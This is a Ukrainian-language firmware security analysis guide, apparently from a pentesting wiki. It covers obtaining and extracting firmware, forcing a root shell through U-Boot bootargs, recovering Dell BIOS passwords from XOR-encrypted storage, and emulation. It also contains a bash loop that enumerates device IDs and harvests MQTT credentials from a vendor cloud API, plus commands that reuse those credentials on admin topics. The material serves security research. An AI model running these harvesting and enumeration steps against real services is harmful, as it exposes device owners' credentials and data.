Firmware — це необхідне програмне забезпечення, яке забезпечує правильну роботу пристроїв, керуючи зв’язком між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі, і сприяючи цьому зв’язку. Воно зберігається в постійній пам’яті, тож пристрій має доступ до важливих інструкцій від моменту ввімкнення, що зрештою призводить до запуску операційної системи. Аналіз firmware та можливе внесення до нього змін — важливий етап виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий етап для розуміння будови пристрою та використовуваних у ньому технологій. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну схему та datasheets
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікати
- Архітектурні діаграми та діаграми потоків
- Оцінювання безпеки та виявлені вразливості

Для цього незамінними є інструменти **open-source intelligence (OSINT)**, а також аналіз усіх доступних компонентів програмного забезпечення з відкритим кодом за допомогою ручної та автоматизованої перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання firmware**

Отримати firmware можна різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** у джерела (розробників, виробників)
- **Зібрати** його за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використати запити **Google dork**, щоб знайти розміщені файли firmware
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопити **оновлення** за допомогою man-in-the-middle технік
- **Витягти** з пристрою через такі підключення, як **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) або **PICit**
- **Перехопити** запити на оновлення в обміні даними пристрою
- Виявити та використати **жорстко задані кінцеві точки оновлення**
- **Зняти дамп** із bootloader або мережі
- Якщо нічого не допомогло, **зняти та зчитати** мікросхему пам’яті за допомогою відповідних апаратних інструментів

### Лише UART-логи: примусово запустіть root shell через U-Boot env у flash

Якщо UART RX ігнорується (доступні лише логи), ви все одно можете примусово запустити init shell, **відредагувавши blob середовища U-Boot** офлайн:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але до розділу env можна записувати через зовнішній доступ до Flash.

### Розкриття захищеного коду через завдання копіювання Firewall

Деякі MCU дають змогу незахищеному коду застосунку викликати шлюз захищеної області замість прямого читання захищеної Flash. Отримавши виконання коду застосунку, перевірте кожне завдання шлюзу як окремий примітив передавання даних у пам’яті. У випадку Cypherock X1 шлюз викликів Firewall STM32L4 приймав завдання, зовнішній вказівник `data`, довжину та захищену `address`. Завдання запису не відхиляло вказівник джерела `data`, що вказував на код Firewall. Викликач не міг прочитати цей код безпосередньо, але сам шлюз міг скопіювати його в захищене енергонезалежне сховище, звідки дозволене завдання читання відкривало до нього доступ.<sup>[[15]](#references)</sup>

Щоб відтворити цей клас розкриття даних, знайдіть сторінку захищеного сховища, доступну для запису й пов’язану із завданням читання, спрямуйте джерело запису на послідовні адреси захищеного коду та зчитайте скопійовані байти. Перш ніж повторювати запис, перевірте тип носія сховища: у цьому випадку це була Flash, тому перед повторним використанням сторінку потрібно було стерти. Дослідники використали процедуру, яка стирала й відновлювала вміст Secure Data Storage, а потім копіювали код у решту вільного простору, не перезаписуючи дані гаманця. Для цього потрібні виконання коду на MCU і доступний шлюз викликів; це не обхід прямого читання з неавтентифікованого хоста.<sup>[[15]](#references)</sup>

Відновлений код може виявити [прогалини в довірі до оновлення прошивки та цілісності завантаження](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Аналіз прошивки

Тепер, коли у вас **є прошивка**, потрібно отримати з неї інформацію, щоб зрозуміти, як із нею працювати. Ось різні інструменти, якими можна скористатися:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдасться багато чого знайти, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: низька ентропія означає, що образ навряд чи зашифрований. Висока ентропія вказує на ймовірне шифрування (або стиснення).

### Необроблені графічні ресурси у зовнішній flash-пам’яті

Дамп зовнішньої SPI-пам’яті не обов’язково містить виконуваний firmware MCU. Для цілі на Cortex-M порівняйте початок кожної потенційної області з кодом із картою пам’яті пристрою: звичайна таблиця векторів починається з правдоподібної адреси вказівника стека SRAM та адреси обробника скидання у виконуваній пам’яті. Відсутність таблиці векторів за нульовим зсувом сама по собі не доводить, що в усьому чипі немає коду; перевірте інші зсуви та схему завантаження. Якщо `binwalk` не виявить контейнер, перевірте сирі байти й зіставте адреси читання flash-пам’яті з [декодованого SPI-запису](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) з діями, що завантажують нові екрани.<sup>[[14]](#references)</sup>

Для області з графічними ресурсами дисплея перевірте можливі формати пікселів і розміри, а не припускайте, що це PNG/JPEG. У пристрої, описаному в джерелі, використовувалися кадри **80×160 RGB565 little-endian**: за два байти на піксель кадр має розмір **25 600 байтів** (25 KiB), а не 24 кілобіти. Декодована адреса читання flash-пам’яті вказала на зсув графічного ресурсу екрана; дослідник конвертував підготовлене зображення командою `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, замінив ресурс такого самого розміру в початковому дампі, записав його командою `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` і переконався, що на дисплеї відображається нове зображення. Це демонструє можливість запису *зовнішніх графічних ресурсів дисплея*, а не вилучення чи перепрошивання внутрішнього firmware MCU. Перед будь-яким записом збережіть початковий дамп і перевірте розміри, порядок байтів, зсув та довжину заміни.<sup>[[14]](#references)</sup>

### Диференційний аналіз flash-пам’яті та відновлювані сховища секретів XOR

Якщо формат зберігання параметра firmware не задокументований, спершу зробіть кілька зіставних зчитувань flash-пам’яті, змініть **рівно один** параметр, а потім знову зчитайте весь чип і порівняйте зсуви. Повторення експерименту з контрольованими значеннями допоможе відрізнити параметр від лічильників і метаданих запису; зміни за новими зсувами, а не на місці, вказують на сховище лише з додаванням або на сховище з журналюванням. Зберігайте записи, позначені як видалені: їхні байти даних можуть залишатися відновлюваними.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Після знаходження області витягніть модулі прошивки за допомогою таких інструментів, як `binwalk`, і виконайте реверс-інжиніринг writer/validator у Ghidra. Перевірте в коді межі полів, доповнення, індексацію ключа та виведення ключа, а не робіть висновки про схему лише за шаблонами шифротексту.<sup>[[12]](#references)</sup>

#### Відновлення ключів із зашифрованого доповнення нулями

Як описано в [шифруванні на основі XOR](../../crypto/symmetric/#xor-based-encryption), відомий відкритий текст розкриває байти ключового потоку на тих самих позиціях. Поле фіксованого розміру особливо вразливе, якщо його доповнення нулями охоплює всі позиції повторюваного XOR-ключа: зашифроване доповнення безпосередньо розкриває ці байти ключа, оскільки `0x00 XOR key_byte = key_byte`. Якщо охоплено кожну позицію ключа, відновіть ключ із кінця шифротексту та розшифруйте заповнені байти.<sup>[[12]](#references)</sup>

Вразливий формат пароля BIOS DVAR від Dell — наочний приклад: байт `0` 32-байтового поля зберігається у відкритому вигляді, а для байтів `1..31` використовується повторюваний 20-байтовий ключ.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Для пароля довжини `L` позиції `L..31` були нульовими до XOR. Коли `L <= 12`, ці позиції охоплюють усі індекси ключа, тож повний ключ і пароль можна відновити без перебору:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Отримання ключів з історичних записів

Не аналізуйте кожен запис окремо. Ключ DVAR приблизно обчислюється як `modified_md5(device_seed || variable_GUID || password[0])`: seed пристрою та GUID незмінні, а єдиний вхідний параметр, що залежить від пароля, — його відкритий перший байт. Це дає не більше 256 ключів на пристрій, тож записи, що починаються з однакового байта, використовують спільний ключ. Згрупуйте активні та видалені записи за цим байтом: короткий історичний запис може розкрити повний ключ через доповнення й дати змогу розшифрувати поточний довший запис, якому бракує доповнення. Тож ротація пароля може збільшити ризик, якщо старий шифротекст лише позначають як видалений, а не стирають.<sup>[[12]](#references)</sup>

Інструмент [`dellpwn`](https://github.com/R3n5k1/dellpwn) знаходить DVAR, перевіряє записи-кандидати, відновлює паролі та може показувати необроблені байти збережених даних і ключів. Зберіть його з checkout і проскануйте перевірений образ flash так:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Для власних парсерів відхиляйте хибні спрацьовування, перевіряючи структуру записів, обмеження на друковані символи, нульове доповнення, ентропію ключа та узгодженість у місці циклічного повторення ключа. Якщо повторні дампи показують поодинокі зміни бітів під час кожного запису, перелічіть спостережені маски та ранжуйте можливі виправлення з урахуванням цих обмежень, але неоднозначні символи позначайте як такі, а не подавайте евристичний результат як точне відновлення.<sup>[[12]](#references)</sup>

У верифікаторах паролів слід зберігати хеш із сіллю, обчислений ітеративно та незворотним способом, а не зворотно зашифрований текст; у журналах транзакцій слід безпечно видаляти застарілі секретні дані.<sup>[[12]](#references)</sup>

### Отримання файлової системи

За допомогою попередніх інструментів, як-от `binwalk -ev <bin>`, ви мали змогти **витягти файлову систему**.\
Зазвичай Binwalk витягує її в **папку, названу за типом файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягування файлової системи

Іноді у сигнатурах binwalk **немає магічних байтів файлової системи**. У таких випадках скористайтеся binwalk, щоб **знайти зсув файлової системи та вирізати стиснену файлову систему** з бінарного файла, а потім **витягніть** її вручну відповідно до її типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Виконайте наведену нижче команду **dd**, щоб витягти файлову систему Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується в прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архіву CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Відновлення розділених вбудованих кореневих файлових систем

Якщо дамп raw eMMC/SSD містить коректний заголовок файлової системи, але її метадані мають зміщення за межами номінального розділу, не вважайте її пошкодженою одразу. Вбудований завантажувальний код може збирати справжній кореневий пристрій із кількох фізичних діапазонів за допомогою Device Mapper, тому вилучення одного розділу GPT дає лише перший сегмент.<sup>[[9]](#references)</sup>

#### Первинне дослідження повного образу носія

Спершу перевірте, що отримання даних завершено, розмір стабільний і жоден процес запису більше не використовує образ. Якщо назва файлу містить початкову й кінцеву адреси, порівняйте цей діапазон із фактичною кількістю байтів. Відновіть GPT у режимі лише для читання та під’єднайте тільки потрібний діапазон; **не** запускайте `vgchange -ay` для ненадійного фізичного тому на робочій станції, оскільки можливі конфлікти груп томів і ненавмисний запис.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

За можливості використовуйте одноразову VM, якщо оригінальна логіка init або стек LVM має бачити весь образ. Історичні журнали завантаження зі стандартного завантажувального розділу особливо корисні: завантажувач міг записати зміщення proprietary-контейнерів, довжини компонентів, вибір слота, правила вирівнювання та результати перевірки підпису. Використайте ці значення, щоб вирізати вбудовані командний рядок, ядро й initramfs, а потім окремо перевірте кожен результат за допомогою `file`, magic bytes і `binwalk`; читання до кінця контейнера може випадково додати до ядра initrd, об'єкт ACPI або підпис.<sup>[[9]](#references)</sup>

#### Відновлення карти блокових пристроїв на етапі завантаження

Витягніть initramfs ядра й виконайте реверс-інжиніринг його `/init` і будь-яких бібліотек для роботи зі сховищем. У розділі [Інструменти реверс-інжинірингу та основні методи](../../reversing/reversing-tools-basic-methods/) знайдіть посилання на рядки `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` і шляхи до розділів; потім простежте код, який вибирає активний слот A/B і будує таблицю. Для початку роботи з radare2 стануть у пригоді `r2 -A init`, `afl`, `pdf @ main` і `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ціль linear зіставляє послідовні діапазони віртуального пристрою з діапазонами одного або кількох базових пристроїв. Відновлена таблиця з двох сегментів зазвичай має такий вигляд (усі позиції та довжини задані в секторах по 512 байтів):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Точно відтворюйте арифметику машинного коду, зокрема розрядність цілих чисел, зсуви та перетворення одиниць. Наприклад, наведений нижче вираз округлює розмір у байтах донизу до межі 4 KiB і лише потім перетворює його на сектори по 512 байтів; заміна на `p4_bytes // 512` змістить вибраний кінцевий фрагмент на `p4_bytes % 4096`, якщо розділ не вирівняний за межами сторінок.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Відновіть плоский образ для аналізу, копіюючи діапазони в порядку таблиці обмеженими блоками, а не завантажуючи весь дамп носія в пам’ять. Це також дає змогу не створювати host-side mapper-пристрої. Залиште отримані з GPT зсуви, обернені кількості секторів і кінцеву довжину вихідних даних окремими твердженнями.<sup>[[9]](#references)</sup>

#### Відрізняйте пошкодження від постійної помилки реконструкції

Для SquashFS перевірте magic `hsqs` і декодуйте поле `bytes_used` у форматі little-endian, 64 біти, зі зміщенням 40 у суперблоці, перш ніж запускати `unsquashfs`. Якщо вилучення не вдається в кількох не пов’язаних між собою структурах, виконайте пошук у широкому вікні навколо очікуваних позицій і вимагайте надійних структурних кандидатів: блок метаданих, який можна розпакувати, кілька послідовних коректних записів каталогу, правдоподібні поля inode, кореневий inode, узгоджений із кількістю inode, або коректну структуру метаданих цілісності. Одного збігу magic недостатньо.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Коли одна й та сама підписана дельта робить валідними незалежні структури — наприклад, метадані каталогу та verity-запис, — імовірною причиною є систематична помилка у визначенні початку сегмента, а не відсутні байти. Поверніться до зворотного обчислення й перевірте, чи не було відкинуто залишки, чи правильно оброблено знаковість і переповнення, а також чи правильно виконано округлення до секторів або сторінок, перш ніж намагатися відновлювати втрачені дані або виправляти метадані файлової системи.<sup>[[9]](#references)</sup>

Нарешті, розрізняйте межі захисту: томи LUKS із ключами, запечатаними в TPM, захищають конфіденційність даних, тоді як підписане зіставлення dm-verity захищає цілісність кореневої файлової системи. Програмний TPM не відновить ключ, запечатаний на оригінальному фізичному TPM, а завантаження модифікованого SquashFS через init, призначений лише для досліджень і такий, що пропускає перевірку verity, не підробляє підпис і не порушує роботу dm-verity.<sup>[[9]](#references)</sup>

## Аналіз прошивки

Після отримання прошивки важливо дослідити її структуру та потенційні вразливості. Для цього використовують різні інструменти, щоб проаналізувати й витягти цінні дані з образу прошивки.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкової перевірки двійкового файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати двійкові дані й отримати відомості про розділи та файлову систему:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність шифрування, тоді як висока може свідчити про шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перегляду файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог із назвою її типу (наприклад, squashfs, ubifs). Однак, якщо **binwalk** не розпізнає тип файлової системи через відсутність magic bytes, потрібне ручне вилучення. Для цього за допомогою `binwalk` знаходять зміщення файлової системи, а потім командою `dd` вирізають її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Згодом, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного видобування вмісту використовують різні команди.

### Аналіз файлової системи

Після видобування файлової системи починається пошук вразливостей. Перевіряють незахищені мережеві демони, жорстко закодовані облікові дані, кінцеві точки API, функції серверів оновлень, нескомпільований код, сценарії запуску та скомпільовані бінарні файли для офлайн-аналізу.

**Ключові розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- Сертифікати й ключі SSL у **etc/ssl**
- Файли конфігурації та сценарії, у яких можуть бути вразливості
- Вбудовані бінарні файли для подальшого аналізу
- Типові вебсервери та бінарні файли IoT-пристроїв

Для виявлення конфіденційної інформації та вразливостей у файловій системі можна скористатися кількома інструментами:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) — для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) — для статичного й динамічного аналізу

### Перевірка безпеки скомпільованих бінарних файлів

Вразливості слід шукати як у вихідному коді, так і в скомпільованих бінарних файлах, знайдених у файловій системі. Інструменти на кшталт **checksec.sh** для бінарних файлів Unix і **PESecurity** для бінарних файлів Windows допомагають виявляти незахищені бінарні файли, які можна експлуатувати.

## Отримання хмарної конфігурації та облікових даних MQTT через похідні URL-токени

Багато IoT-хабів отримують конфігурацію для кожного пристрою з хмарної кінцевої точки такого вигляду:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки можна виявити, що `<token>` локально обчислюється на основі ID пристрою та жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді шістнадцяткового рядка у верхньому регістрі

Така схема дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відновити URL і завантажити хмарну конфігурацію, яка часто містить облікові дані MQTT у відкритому тексті та префікси топіків.

Практичний порядок дій:

1) Отримайте deviceId з журналів завантаження UART

- Під’єднайте UART-адаптер на 3,3 В (TX/RX/GND) і збережіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Шукайте рядки, що виводять шаблон URL конфігурації хмари та адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм генерації token із прошивки

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть token у Bash і переведіть digest у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть конфігурацію хмари та облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; розберіть його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте незашифрованим MQTT і слабкими ACL для топіків (якщо є)

- Використовуйте отримані облікові дані, щоб підписатися на топіки обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Перелічіть передбачувані ID пристроїв (у масштабі, з дозволу)

- Багато екосистем містять байти OUI виробника/продукту/типу, за якими йде послідовний суфікс.
- Можна перебирати кандидатні ID, програмно виводити tokens і отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Примітки
- Завжди отримуйте явний дозвіл, перш ніж намагатися виконувати масове перебирання.
- За можливості віддавайте перевагу емуляції або статичному аналізу для відновлення секретів без модифікації цільового обладнання.


Емуляція прошивки дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може ускладнюватися залежностями від обладнання чи архітектури, але перенесення кореневої файлової системи або окремих двійкових файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може полегшити подальше тестування.

### Емуляція окремих двійкових файлів

Для аналізу окремих програм важливо визначити порядок байтів і архітектуру процесора програми.

#### Приклад з архітектурою MIPS

Для емуляції двійкового файла з архітектурою MIPS можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб встановити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (з порядком байтів від старшого до молодшого) використовується `qemu-mips`, а для бінарних файлів із порядком байтів від молодшого до старшого підійде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес подібний: для емуляції використовується емулятор `qemu-arm`.

### Емуляція повної системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, спрощують емуляцію прошивки повністю, автоматизують цей процес і допомагають у динамічному аналізі.

### Відновлення розділених і перевірених кореневих файлових систем для емуляції

Якщо суперблок SquashFS читається, але зміщення inode, каталогів або таблиці фрагментів виявляються неможливими, не поспішайте виправляти `unsquashfs`. Проведіть реверс-інжиніринг бінарного файла раннього етапу завантаження та відтворіть граф блокових пристроїв, який він створює: вбудовані системи можуть надавати номінальний кореневий розділ, але створювати справжню файлову систему за допомогою зіставлення `dm-linear`, яке додає сектори з іншого розділу. Перевірка лише суперблока може пройти успішно, навіть якщо всі подальші блоки метаданих зміщені.<sup>[[11]](#references)</sup>

Точно відтворюйте арифметику прошивки. Зокрема, з'ясуйте, чи довжини задано в байтах, секторах по 512 байтів або сторінках по 4 КіБ; відтворіть зсуви та усічення в їхньому початковому порядку; врахуйте залежні від банку кінцеві ділянки в конфігураціях A/B. Наприклад, `(partition_bytes >> 12) << 3` спочатку усікає значення до межі 4 КіБ, а потім виражає результат у секторах по 512 байтів. Заміна цього виразу на `partition_bytes // 512` може змістити додану область на кілька кілобайтів і пошкодити всі подальші таблиці SquashFS.<sup>[[11]](#references)</sup>

Корисний порядок перевірки:<sup>[[11]](#references)</sup>

1. Відновіть для кожного сегмента `dm-linear` вихідний пристрій, початковий сектор і довжину на основі бінарного файла верифікатора/`init`.
2. Об'єднайте або зіставте області, не змінюючи семантику їхнього вирівнювання.
3. Якщо видобування все ще не вдається, перевірте невелике вікно навколо передбаченої межі та вимагайте кількох послідовних коректних структур метаданих, а не приймайте лише правдоподібний суперблок.
4. Запустіть незмінену версію `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є вагомішим доказом, ніж результат `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Якщо аналітик контролює ядро QEMU, initramfs і віртуальні диски, модифіковану кореневу файлову систему можна завантажити, замінивши вендорний PID 1, що виконує перевірку, на невеликий статично скомпонований `init`. Це **лабораторна підміна ланцюжка завантаження**, а не злам dm-verity, його підпису RSA, Secure Boot або ключа, запечатаного TPM.<sup>[[11]](#references)</sup>

Замінний `init` має відтворювати операційні етапи початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під'єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блокового пристрою, змонтувати відредаговану кореневу файлову систему лише для читання, від'єднати псевдофайлові системи старого кореня, перемістити нове монтування в `/`, виконати `chroot` і `execve()` для початкового `/sbin/init` прошивки. Від'єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` запобігає випадковому від'єднанню точок монтування, що належать новому кореню.<sup>[[11]](#references)</sup>

Зберігайте змінний стан пристрою окремо від модифікованої незмінної кореневої файлової системи. Оверлей qcow2 може зберегти стан LVM початкового диска, а другий диск virtio, змонтований лише для читання, — надати відредаговану файлову систему SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану образу офлайн

Перевіряйте постійний стан за межами гостьової системи, якщо повільне завантаження, руйнівні стартові скрипти або ненадійне журналювання консолі ускладнюють пошук причини збою. Ніколи не підключайте overlay, яким користується запущена VM; відкрийте до нього доступ за допомогою `qemu-nbd`, обмежте пошук LVM потрібним розділом NBD і деактивуйте групу томів перед відключенням.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для відтворюваної ізоляції несправностей записуйте файли-маркери з часовими мітками на стабільний доступний для запису том і перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть спричинити хибнонегативні результати через обмеження частоти запису або передчасне завершення процесу. Також перед зміною стороннього коду порівнюйте точні інтерфейси між рівнями: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL`, ABI драйвера DRI і назви драйверів, визначені за PCI. Компонент може існувати й навіть успішно завантажуватися через `dlopen()`, але залишатися непридатним до використання, якщо його споживач очікує інший ABI.<sup>[[11]](#references)</sup>

## Dynamic Analysis in Practice

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберегти доступ до оболонки ОС і файлової системи. Емуляція може не повністю відтворювати взаємодію з обладнанням, тому іноді доводиться перезапускати емуляцію. Аналіз має охоплювати повторну перевірку файлової системи, дослідження доступних вебсторінок і мережевих служб, а також пошук уразливостей завантажувача. Перевірки цілісності firmware критично важливі для виявлення потенційних уразливостей, пов’язаних із backdoor.

## Runtime Analysis Techniques

Runtime-аналіз передбачає взаємодію з процесом або бінарним файлом у середовищі його виконання за допомогою таких інструментів, як gdb-multiarch, Frida і Ghidra, для встановлення точок зупинки та виявлення вразливостей за допомогою fuzzing та інших методів.

Для embedded-пристроїв без повноцінного debugger **скопіюйте на пристрій статично скомпонований `gdbserver`** і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

